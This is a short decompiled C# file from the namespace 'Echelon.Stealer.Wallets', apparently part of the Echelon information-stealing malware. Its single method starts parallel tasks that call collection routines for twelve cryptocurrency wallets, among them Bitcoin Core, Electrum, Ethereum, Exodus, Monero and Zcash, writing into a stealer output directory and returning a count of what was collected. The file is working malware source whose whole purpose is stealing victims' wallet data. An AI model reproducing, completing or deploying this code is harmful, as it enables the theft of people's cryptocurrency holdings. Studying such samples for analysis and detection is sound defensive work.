using System;
using System.Threading.Tasks;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000F RID: 15
	internal class Wallets
	{
		// Token: 0x06000024 RID: 36 RVA: 0x0000387C File Offset: 0x00001A7C
		public static int GetWallets(string Echelon_Dir)
		{
			Task[] array = new Task[]
			{
				new Task(delegate()
				{
					Armory.ArmoryStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					AtomicWallet.AtomicStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					BitcoinCore.BCStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Bytecoin.BCNcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					DashCore.DSHcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Electrum.EleStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Ethereum.EcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					LitecoinCore.LitecStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Monero.XMRcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Exodus.ExodusStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Jaxx.JaxxStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Zcash.ZecwalletStr(Echelon_Dir);
				})
			};
			Task[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				array2[i].Start();
			}
			Task.WaitAll(array);
			return Wallets.count;
		}

		// Token: 0x04000024 RID: 36
		public static int count;
	}
}
